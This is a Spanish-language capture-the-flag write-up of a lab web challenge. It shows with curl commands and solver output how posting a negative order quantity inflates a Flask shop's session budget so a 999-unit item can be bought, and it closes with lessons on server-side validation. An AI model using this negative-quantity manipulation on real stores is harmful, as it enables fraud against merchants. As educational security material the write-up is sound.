# Desafío 43 — Bodega de farmacia

| Campo | Valor |
|---|---|
| Evento | Código de Marte 2026-11-13 (`codigodemarte20261113`) |
| Categoría | Web / lógica de negocio (abuso de validación) |
| Dificultad | fácil-media |
| Puntos | 373 (10 soluciones al momento del análisis) |
| Objetivo | `http://203.0.113.10:8005` |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado

> La farmacia tiene 100 unidades de presupuesto. La "Llave de bodega central" cuesta 999 y es la única forma de ver la flag. Los formularios no siempre validan lo que deberían.

## Reconocimiento

- `GET /` devuelve una app Flask detrás de **gunicorn** (`Server: gunicorn`, cookie `session`
  firmada con itsdangerous).
- El cookie es estado en el cliente y se puede leer sin la clave:

  ```
  {"inventario":{"gasa":0,"jeringa":0,"llave":0},"presupuesto":100}
  ```

- Catálogo y precios (en el HTML):

  | Item (`item=`) | Precio | Stock inicial |
  |---|---|---|
  | `gasa` — Caja de gasas estériles | 20 u. | 0 |
  | `jeringa` — Set de jeringas | 15 u. | 0 |
  | `llave` — Llave de bodega central | 999 u. | 0 |

- Rutas existentes: `/`, `/pedir` (POST), `/reiniciar` (GET), `/cdm.css`. El resto responde 404.
- Los formularios de pedido declaran `min="1" max="99"` en el `<input type="number">`: esa es la
  única barrera de validación. Además hay un formulario `codigo` con placeholder `AUTH-...`.

## Análisis

El mensaje «Los formularios no siempre validan lo que deberían» apunta a que la validación vive
solo en el navegador (atributos `min`/`max`) y no en el servidor.

Pruebas contra `POST /pedir`:

| `item` | `cantidad` | Resultado del servidor |
|---|---|---|
| `gasa` | `1` | `Pedido registrado.` (302 a `/?msg=...`) |
| `gasa` | `1.5`, `abc`, `1e2` | `Cantidad invalida.` |
| `gasa` | `-5` | `Pedido registrado.` ← **acepta negativos** |
| `llave` | `1` | `Presupuesto insuficiente.` (999 > 100) |
| `codigo=AUTH-1` | — | `Codigo de autorizacion no reconocido.` |

El servidor hace `int(cantidad)` y calcula `costo = cantidad * precio`; si `costo > presupuesto`
rechaza. Con `cantidad` negativa el costo es negativo, no supera el presupuesto y se **suma** al
saldo:

```
presupuesto_nuevo = presupuesto - (cantidad * precio)
                  = 100 - (-50 * 20) = 1100
```

Con 1100 unidades ya se puede comprar la llave de 999.

> Nota de método: el primer intento con `fetch(..., redirect:"manual")` desde el entorno Node
> siguió la redirección 302 y descartó el `Set-Cookie`, por lo que parecía que el estado no
> cambiaba. El POST real responde **302** y entrega el nuevo cookie de sesión; hay que conservarlo
> (`curl -c/-b`, `requests.Session` o el navegador). Es un detalle clásico de Flask: el estado se
> escribe en el cookie de la respuesta, no en el cuerpo.

## Solución (pasos reproducibles)

```bash
jar=$(mktemp)
curl -s -c $jar -b $jar -o /dev/null http://203.0.113.10:8005/

# 1) Pedido con cantidad negativa: inyecta presupuesto
curl -s -c $jar -b $jar -o /dev/null \
     -d "item=gasa&cantidad=-50" http://203.0.113.10:8005/pedir
# sesion: inventario.gasa=-50, presupuesto=1100

# 2) Comprar la llave (999)
curl -s -c $jar -b $jar -o /dev/null \
     -d "item=llave&cantidad=1" http://203.0.113.10:8005/pedir
# sesion: inventario.llave=1, presupuesto=101

# 3) Ver la bodega
curl -s -c $jar -b $jar http://203.0.113.10:8005/ | grep -o 'cdm{[^}]*}'
```

Automatizado: `python scripts/solve.py` (usa `requests.Session`, imprime el estado de cada paso,
extrae la flag y la deja en `flag.txt`).

```text
[*] sesion inicial: {'inventario': {'gasa': 0, 'jeringa': 0, 'llave': 0}, 'presupuesto': 100}
[*] pedir gasa x -50 -> {'inventario': {'gasa': -50, ...}, 'presupuesto': 1100}
[*] pedir llave x 1 -> {'inventario': {..., 'llave': 1}, 'presupuesto': 101}
[+] FLAG: flag{ejemplo}
```

Al tener `llave: 1` en el inventario, `GET /` muestra:

```html
<div class="msg ok">Llave de bodega obtenida:<br><span class="flag">flag{ejemplo}</span></div>
```

## Flag

```
flag{ejemplo}
```

## Lecciones / notas

- **Validación solo en el cliente = no hay validación.** `min`/`max`/`required` en HTML son UX,
  no control de seguridad; el servidor debe validar rango, tipo y signo.
- **Abuso de lógica de negocio**: cantidades negativas convierten un gasto en un ingreso
  (equivalente a *negative quantity / price manipulation* en tiendas).
- **Estado en cookie firmada**: aunque no se pueda forjar sin la clave, se puede leer (Base64) y,
  sobre todo, manipular indirectamente a través de la lógica que sí escribe en la sesión.
  Aquí no hizo falta romper la firma.
- Descartado: forja del cookie (firma itsdangerous), rutas ocultas, inyección en `codigo`
  (`AUTH-1` rechazado). No se necesitó fuerza bruta.
- Evidencia cruda del intercambio HTTP en `evidence/` (peticiones y respuestas, incluido el
  `Set-Cookie` con el presupuesto inflado y la página final con la flag).
